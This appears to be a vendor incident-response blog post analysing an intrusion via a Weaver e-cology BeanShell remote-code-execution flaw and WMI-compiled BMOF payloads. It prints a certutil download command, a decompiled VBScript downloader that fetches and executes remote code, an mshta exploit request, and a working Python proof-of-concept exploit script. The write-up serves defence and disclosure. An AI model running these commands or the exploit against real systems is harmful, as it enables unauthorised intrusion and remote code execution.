@@ -1,0 +1,225 @@
+This blog post covers an interesting intrusion attempt that Mandiant Managed Defense thwarted involving the rapid weaponization of a recently disclosed vulnerability combined with the creative use of WMI compiled “.bmf”
+
+ files and CertUtil for obfuscated execution.
+
+This intrusion attempt highlights a number of valuable lessons in security, chiefly: attackers work fast – faster than many security teams can react.
+
+Additionally, patching complex software environments while keeping the business operational makes it difficult to keep pace with attackers exploiting vulnerabilities, especially when these truths are coupled with rapid exploitation with innovative obfuscation methods utilizing the operating systems own feature set against it.
+
+Everybody’s Working for the Recon While monitoring our customers around the clock, FireEye Managed Defense identified suspicious file write activity on a system at a European manufacturing client and began our initial investigation by collecting the available volatile and non-volatile data from the affected host.
+
+ 
+
+Once evidence collection had completed, we began parsing the forensic data using the parsers available in FireEye's free Redline forensic analysis tool.
+
+Analysis of the logs quickly revealed that there were commands executed on the host which were consistent with interactive reconnaissance activity.
+
+Typically, once a host has successfully been compromised, attackers are presented with a command shell window which allows them to run commands on the host.
+
+These commands can consist of reconnaissance activity which expose useful information about the host to the attacker.
+
+The following is a snippet of the commands that we observed successfully executed on the host: ipconfig.exe ipconfig /all whoami.exe whoami The associated parent process that handled execution of the aforementioned listed processes was: \"\\Weaver\\jdk_new\\bin\\javaw.exe\".
+
+FOMBs AWAY!
+
+Once the attackers gained access to the web server by exploiting an unknown vulnerability, they attempted to further pivot control within the system through the use of Windows Management Instrumentation (WMI).
+
+ They leveraged WMI's execution process, which takes Managed Object Format (MOF) files as input and compiles them into the WMI buffer, resulting in a compiled “.bmf”
+
+ output file.
+
+The attackers wrote their second-stage payload and compiled it with WMI.
+
+Finally, they uploaded the compiled “.bmf”
+
+ file to their web server and modified the file to masquerade as a \".rar\" file .
+
+Upon further assessment of the activity, we observed that after the threat actors gained access to the affected web server, they utilized a Windows native binary called “Certutil.exe” to download malicious code from a remote resource .
+
+Our investigation revealed that an instance of the process “Certutil.exe” was executed with the following command line arguments: certutil  -urlcache
+
+ -split -f http://[DOMAIN]/uploads/180307/l.rar c:\\windows\\temp\\l.rar Options Description -urlcache Display or delete URL cache entries -split Split embedded ASN.1 elements, and save to files -f Force overwrite (Source: Microsoft certutil page )
+
+FireEye has observed this methodology executed numerous times by both ethical hackers and unauthorized threat actors in addition to Certutil’s benign use as a part of legitimate business applications and operations.
+
+Shortly after the second-stage payload was downloaded, we observed several file write events related to `l.rar` (MD5: 4084eb4a41e3a01db2fe6f0b91064afa).
+
+Of particular note were: cmd.exe  cmd /c mofcomp.exe C:\\Windows\\temp\\l.rar cmd.exe cmd /c del C:\\Windows\\temp\\l.rar
+
+The aforementioned commands utilize Window's \"cmd.exe\" interpreter to run \"mofcomp.exe\" on the newly obtained \"l.rar\".
+
+This process is designed to parse a file containing MOF statements and add any class and class instances defined in the file to the WMI repository , and subsequently delete the aforementioned file.
+
+The use of “mofcomp.exe” for attackers and defenders was first proposed at MIRcon 2014 by FireEye Mandiant incident responders Christopher Glyer and Devon Kerr in their “There’s Something about WMI” talk (Figure 1).
+
+Figure 1: Proposed use of MOF files for red and blue teams We obtained the file \"l.rar\" for further analysis and observed that the file header began with \"FOMB\".
+
+This file header when conveniently flipped is \"BMOF\", as in Binary Managed Object Format.
+
+With this information in hand we began searching for methods to reverse the compiled binary.
+
+Upon analyzing the file in FireEye's sandbox environment, we were able to obtain the following information from the BMOF file:
+
+On Error Resume 
+
+Next:execmydler():Function execmydler():Set P=CreateObject(\"WinHttp.
+
+WinHttpRequest.5.1\"):P[.]Open \"GET\",\"hxxp[://[DOMAIN]/d/dl[.]asp\",0:P[.]Send():b=
+
+P[.]responseText:M=
+
+Spli t(b,\",\",-1,1):For Each Od
+
+In M:
+
+Nd=Nd+Chr(Od-
+
+2):Next:
+
+Set P=
+
+Nothing:
+
+If Len(Nd)
+
+> 10 Then:Execute(Nd):End 
+
+If:End In an attempt to masquerade activities, the attackers wrote an MOF script and compiled it into a BMOF file, then ran the malicious BMOF file on the victim machine via WMI.
+
+The aforementioned code attempts to download a second-stage payload from \"hxxp[://[DOMAIN]/d/dl[.]asp\" when executed.
+
+Since the WMI buffer is involved, this attack vector opens the door to gaining a persistent foothold in the victim environment.
+
+During this research period we also found an open-sourced project titled \"bmfdec\" that also decompiled BMOF files.
+
+Uncovering the Exploit The attackers were active on September 22, and as such the majority of the investigation was conducted around this timeframe.
+
+Analysis of FireEye Endpoint Security ring buffer events uncovered reconnaissance commands executed on the system including whoami , ipconfig and the downloading of additional binaries.
+
+However, further analysis of the system did not uncover an initial exploit within the same timeframe of these commands.
+
+Analysis of the HTTP logs also did not uncover the initial payload.
+
+Within the HTTP logs we identified suspicious HTTP POST requests including requests to ’/weaver/bsh.servlet.
+
+BshServlet/` , but this was a busy server and the payload was not included in the logging, only metadata.
+
+Example HTTP log entry '-` 2886000` 10.10.10.10` -` -` \"[23/Sep/2019:10:10:10 +0800]\"` \"POST /weaver/bsh.servlet.
+
+BshServlet/ HTTP/1.1\"`  \"-\"' FireEye Endpoint Security has the ability to collect a memory image and this was completed on the same day as the initial activity.
+
+As memory is volatile, the earlier it's collected in an investigation the more likely you are to uncover additional evidence.
+
+We used Volatility to analyze the memory image looking for any suspicious event log entries, process creation, registry entries, etc.
+
+While reviewing the memory image, we identified numerous instances of mshta.exe spawned under javaw.exe , the creation date for these processes was 2019-09-20, and we pivoted our investigative focus to that date.
+
+.. httpd.exe            2388    604      3     84 2019-06-28 09:32:53 UTC+0000 ... java.exe            2420   2388      0 ------ 2019-06-28 09:32:53 UTC+0000 .... javaw.exe          4804   2420     36    530 2019-06-28 09:33:19 UTC+0000 ..... javaw.exe         
+
+5976   4804    177   4925 2019-06-28 09:33:21 UTC+0000 ...... mshta.exe       17768   5976     12    320 2019-09-20 14:20:00 UTC+0000 ...... mshta.exe        9356   5976     12    306 2019-09-20 11:12:04 UTC+0000 ...... mshta.exe       22416   5976     12    310 2019-09-20 11:31:14 UTC+0000 ...... mshta.exe       23240   5976     13    318 2019-09-20 14:20:01 UTC+0000 ...... mshta.exe       15116   5976     12    311 2019-09-20 11:31:23 UTC+0000
+
+This matched our initial findings and gave us some further context.
+
+Unfortunately, the initially-acquired forensic evidence, including the endpoint triage package and the memory image, did not provide a conclusive filesystem narrative around that date.
+
+At this stage the client had pulled the system offline and began remediation steps, however we still didn't know exactly which exploit was leveraged to gain a foothold on this system.
+
+We knew the process path which indicated it was httpd.exe being leveraged to run malicious javaw.exe commands.
+
+This lined up with our HTTP log analysis, yet we didn't have the payload.
+
+String it to Weaver Anybody who's worked in incident response long enough knows that when parsing the data has failed to uncover the evidence you're looking for, the last thing you can try is sifting through the raw bytes and strings of a file.
+
+Volatility has a handy feature to map the string offset to the corresponding process and virtual address.
+
+Once this is complete grep searching for specific keywords and filtering through the strings identified a number of HTTP POST requests sitting in unallocated space, expanding our grep using it's context parameter uncovered interesting HTTP POST requests and their payload.
+
+Example POST payload: POST /weaver/bsh.servlet.
+
+BshServlet/ HTTP/1.1 Host: x.x.x.x:88 Connection: close Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept-Language: en-US,en;q=0.5 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 134 bsh.script=eval .(\"ex\"+\"ec(\\\"mshta
+
+ hxxp:// www[DOMAIN]/index[.]hta\\\")\");&bsh.servlet.output=raw23; languageidweaver=7; testBanCookie=test; JSESSIONID=xxxxxxxxxx; Systemlanguid=7 tBanCookie=test; Systemlanguid=7; loginidweaver=
+
+xxx
+
+st; Systemlanguid=7; loginidweaver=
+
+xxx We knew this was the exploit we were looking for.
+
+The payload was exactly what the attacker was executing and the URI confirmed the process path we had identified from the memory image.
+
+It was making a request to BshServlet .
+
+It was unclear if this vulnerability was known, as there was no CVE associated with the software.
+
+ Open source research identified a number of Chinese blog sites discussing a newly identified RCE vulnerability with Weaver e-cology OA system.
+
+The vulnerability lies within the BeanShell component of the OA system.
+
+The attacker could send a specially crafted payload to ’\\weaver/bsh.servlet.
+
+BshServlet` in order to launch arbitrary commands.
+
+The following POC script was discovered on one of the aforementioned Chinese blog sites.
+
+MD5: 49b23c67c2a378fb8c76c348dd80ff61 import requests import sys headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko)
+
+Version/12.0 Safari/1200.1.25', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded' } def exploit(url,cmd): target=
+
+url+'/weaver/bsh.servlet.
+
+BshServlet' payload='bsh.script=eval%00(\"ex\"%2b\"ec(\\\\\"cmd+/c+{}\\\\\")\");&bsh.servlet.captureOutErr=
+
+true&bsh.servlet.output=raw'.format(cmd) res=requests.post(url=target,data=payload,headers=headers,timeout=10) res.encoding=res.apparent_encoding print(res.text) if __name__ == '
+
+__main__': url=sys.argv[1] while(1): cmd=input('cmd:')
+
+exploit(url,cmd)
+
+The script contained some hardcoded HTTP header values including user-agent, accepted data types, accepted languages and content-type.
+
+The script builds an HTTP request and allows the user to specify the command they would like to run; it would then append the URL and command to the crafted exploit to execute.
+
+In our instance the attacker was leveraging this vulnerability to launch mshta.exe to download a second stage payload.
+
+Using search engines for internet connected devices such as Shodan or Censys we can quickly identify systems running the Weaver e-cology platform.
+
+Using this technique, we identified 28 internet facing system that are potentially vulnerable.
+
+Conclusion This isn't a new story; Managed Defense responds to cases like this every week.
+
+The usage of FOMB was particularly interesting in this instance and it's the first case in Managed Defense we've seen this technique being leveraged in an attempt to bypass defenses.
+
+ When leveraged correctly, compiled “.bmf”
+
+ files can be effectively used to sneak into an environment undetected and gain a foothold via persistence in the WMI buffer.
+
+There are many procedural and technical controls that could help prevent a system being compromised.
+
+Most larger enterprises are complex and identifying all publicly exposed software and services can be challenging.
+
+We’ve worked on many cases where system administrators didn’t believe their system was directly accessible from the internet only to later confirm it was.
+
+Prioritizing particular patches can be difficult and if you don’t think a RCE vulnerability is exposed then the Risk level might be incorrectly classified as low.
+
+A combination of controls is typically the best approach.
+
+In Managed Defense we assume these controls are imperfect and attackers will find a way to bypass them.
+
+Deploying strong monitoring capabilities combined with a team of analysts hunting through lower fidelity signatures or “weak signals” can uncover otherwise unnoticed adversaries.
+
+Learn more about Mandiant Managed Defense here .
+
+ Catch an on-demand recap on this and the Top 5 Managed Defense attacks this year.
+
+Weaver Build Timeline 2019-09-20:
+
+Weaver Patch released 2019-09-20: Exploit observed in Managed Defense 2019-09-22:
+
+Exploit POC blogged 2019-10-03:
+
+First public mention outside China References Microsoft certutil page Microsoft mofcomp page bmfdec GitHub page Weaver Threat Alert Volatility GitHub page Subscribe to Blogs Get email updates as new blog posts are added.
+
+
+
+
